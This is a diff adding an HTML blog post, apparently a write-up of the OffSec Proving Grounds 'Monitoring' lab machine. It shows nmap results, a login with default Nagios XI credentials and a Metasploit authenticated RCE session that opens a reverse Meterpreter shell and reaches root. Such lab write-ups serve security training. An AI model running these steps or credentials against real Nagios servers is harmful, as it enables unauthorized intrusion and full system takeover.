@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Play: Monitoring</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Play: Monitoring | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Play: Monitoring" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds play linux machine writeup" />
+<meta property="og:description" content="Offsec proving grounds play linux machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/09/25/Proving_grounds_Play-Monitoring.html" />
+<meta property="og:url" content="http://localhost:4000/2023/09/25/Proving_grounds_Play-Monitoring.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-09-25T03:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Play: Monitoring" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-09-25T03:00:00+05:30","datePublished":"2023-09-25T03:00:00+05:30","description":"Offsec proving grounds play linux machine writeup","headline":"Proving grounds Play: Monitoring","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/09/25/Proving_grounds_Play-Monitoring.html"},"url":"http://localhost:4000/2023/09/25/Proving_grounds_Play-Monitoring.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/09/25/Proving_grounds_Play-Monitoring.html">
+    <h2 class="post-title">Proving grounds Play: Monitoring</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Sep 25, 2023</div></div>
+  <div class="post">
+    <h2 id="nmap">Nmap</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 b88c40f65f2a8bf792a8814bbb596d02 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 e7bb11c12ecd3991684eaa01f6dee619 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 0f8e28a7b71d60bfa62bdda36dd14ea4 <span class="o">(</span>ED25519<span class="o">)</span>
+25/tcp  open  smtp     Postfix smtpd
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>ubuntu
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>ubuntu
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-09-08T17:59:00
+| Not valid after:  2030-09-06T17:59:00
+| MD5:   e0671ea392c2ec73cb21de0e73dfcb66
+|_SHA-1: e39cc9b6c35bb6083dd0cd25e60fcb616551da77
+80/tcp  open  http     Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-favicon: Unknown favicon MD5: 8E1494DD4BFF0FC523A2E2A15ED59D84
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Nagios XI
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
+443/tcp open  ssl/http Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+_http-title: Nagios XI
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>192.168.1.6/organizationName<span class="o">=</span>Nagios Enterprises/stateOrProvinceName<span class="o">=</span>Minnesota/countryName<span class="o">=</span>US
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>192.168.1.6/organizationName<span class="o">=</span>Nagios Enterprises/stateOrProvinceName<span class="o">=</span>Minnesota/countryName<span class="o">=</span>US
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2020-09-08T18:28:08
+| Not valid after:  2030-09-06T18:28:08
+| MD5:   20f0951f8eff1b69ef3f1b1efb4c361f
+|_SHA-1: cc400ad760cf49591c92d9ab0f06106c18f66661
+</code></pre></div></div>
+
+<h2 id="web-port-80">Web PORT: 80</h2>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Monitoring/web.png" alt="img" /></p>
+
+<p>The port 80 is restricting the users from logging into the admin dashboard.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NSP: Sorry Dave, I can't let you do that
+</code></pre></div></div>
+
+<h2 id="web-port-443">Web PORT: 443</h2>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Monitoring/web.png" alt="img" /></p>
+
+<p>Use credentials <code class="language-plaintext highlighter-rouge">nagiosadmin:admin</code> to login to the portal. The Nagios XI 5.6.0 is vulnerable to authenticated remote code execution. The foothold can be acheived by using the metasploit module.</p>
+
+<h2 id="foothold">Foothold</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>linux/http/nagios_xi_plugins_check_plugin_authenticated_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>password admin
+password <span class="o">=&gt;</span> admin
+msf6 exploit<span class="o">(</span>linux/http/nagios_xi_plugins_check_plugin_authenticated_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost 192.168.45.233
+lhost <span class="o">=&gt;</span> 192.168.45.233
+msf6 exploit<span class="o">(</span>linux/http/nagios_xi_plugins_check_plugin_authenticated_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 192.168.167.136
+RHOSTS <span class="o">=&gt;</span> 192.168.167.136
+msf6 exploit<span class="o">(</span>linux/http/nagios_xi_plugins_check_plugin_authenticated_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RPORT 443
+RPORT <span class="o">=&gt;</span> 443
+msf6 exploit<span class="o">(</span>linux/http/nagios_xi_plugins_check_plugin_authenticated_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>SSL <span class="nb">true</span>
+<span class="o">[!]</span> Changing the SSL option<span class="s1">'s value may require changing RPORT!
+SSL =&gt; true
+msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) &gt; run
+
+[*] Started reverse TCP handler on 192.168.45.233:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Attempting to authenticate to Nagios XI...
+[+] Successfully authenticated to Nagios XI
+[*] Target is Nagios XI with version 5.6.0
+[+] The target appears to be vulnerable.
+[*] Uploading malicious '</span>check_ping<span class="s1">' plugin...
+[*] Command Stager progress - 100.00% done (897/897 bytes)
+[+] Successfully uploaded plugin.
+[*] Executing plugin...
+[*] Waiting up to 300 seconds for the plugin to request the final payload...
+[*] Sending stage (3045348 bytes) to 192.168.167.136
+[*] Meterpreter session 1 opened (192.168.45.233:4444 -&gt; 192.168.167.136:51442) at 2023-09-25 07:06:23 -0400
+[*] Deleting malicious '</span>check_ping<span class="s1">' plugin...
+[+] Plugin deleted.
+
+meterpreter &gt; shell
+whoami
+root
+</span></code></pre></div></div>
+
+<p><strong>Foothold Obtained</strong></p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
